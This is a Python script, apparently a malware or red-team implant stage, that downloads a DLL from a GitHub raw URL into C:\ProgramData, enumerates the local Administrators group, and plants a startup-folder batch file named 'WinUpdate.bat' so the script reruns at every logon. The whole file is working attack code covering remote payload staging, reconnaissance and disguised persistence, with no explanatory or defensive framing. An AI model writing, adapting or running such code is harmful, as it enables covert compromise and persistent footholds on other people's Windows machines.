import os
import subprocess
import urllib.request

# ═══════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════
dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/TEST_Dll1.dll"
dll_path  = r"C:\ProgramData\TEST_Dll1.dll"
log_path  = r"C:\ProgramData\stage1.log"
self_py   = r"C:\ProgramData\hklib.py"
self_exe  = r"C:\ProgramData\py3\python.exe"
bat_name  = "WinUpdate.bat"

# ═══════════════════════════════════════════════
# PHASE 1: DLL Staging (download only if not present)
# ═══════════════════════════════════════════════
if os.path.exists(dll_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] DLL already staged at {dll_path}\n")
else:
    try:
        urllib.request.urlretrieve(dll_url, dll_path)
        with open(log_path, 'a') as f:
            f.write(f"[OK] DLL staged to {dll_path}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Download failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 2: Local Admin Enumeration (always runs)
# ═══════════════════════════════════════════════
try:
    result = subprocess.run(
        ['net', 'localgroup', 'Administrators'],
        capture_output=True, text=True
    )
    with open(log_path, 'a') as f:
        f.write("=== Local Admin Group ===\n")
        f.write(result.stdout)
        f.write("=========================\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Enumeration failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 3: Self-Persistence (Startup Folder .bat)
# ═══════════════════════════════════════════════
startup_folder = os.path.expandvars(
    r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
)
bat_path = os.path.join(startup_folder, bat_name)
bat_content = f'@echo off\n"{self_exe}" "{self_py}"'

if os.path.exists(bat_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] Startup .bat already exists at {bat_path}\n")
else:
    try:
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        with open(log_path, 'a') as f:
            f.write(f"[OK] Self-persistence established via Startup .bat file '{bat_name}'.\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Startup persistence failed: {e}\n")
